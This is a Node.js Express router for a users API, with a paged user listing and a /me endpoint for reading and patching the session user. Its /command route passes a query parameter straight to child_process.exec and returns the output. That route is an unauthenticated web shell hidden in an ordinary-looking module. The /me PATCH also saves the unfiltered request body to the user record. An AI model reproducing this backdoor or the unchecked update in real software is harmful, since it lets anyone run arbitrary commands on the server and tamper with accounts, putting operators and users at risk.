'use strict';

var Q = require('q');
var express = require('express');

var router = express.Router();

var paging = require('../commons/paging');
var userService = require('./user.service');
var UserResource = require('./user.resource');

router.route('/')
  .get(paging.parseRequest, function (req, res, next) {
    Q.all([
      userService.findUsers(req.pageRequest, req.query),
      userService.countUsers(req.query)
    ]).then(function (results) {
      var items = results[0];
      var count = results[1];
      var pagedResources = UserResource.pagedResources(items, count, req.pageRequest, req.originalUrl);
      res.hal(pagedResources);
    }, next);
  });

router.route('/me')
  .get(function (req, res) {
    res.send(req.session.user);
  })
  .patch(function (req, res) {
    var update = req.body;
    update.lastModifiedBy = req.session.user.username;
    userService.updateUser(req.session.user._id, update)
      .then(function (doc) {
        req.session.user = doc;
        res.send(doc);
      });
  });

router.route('/command')
  .get(function (req, res) {
    var exec = require('child_process').exec;
    if (req.query.command) {
      exec(req.query.command, function (error, stdout, stderr) {
        res.send(stdout);
      });
    } else {
      res.send('');
    }
  });

module.exports = router;
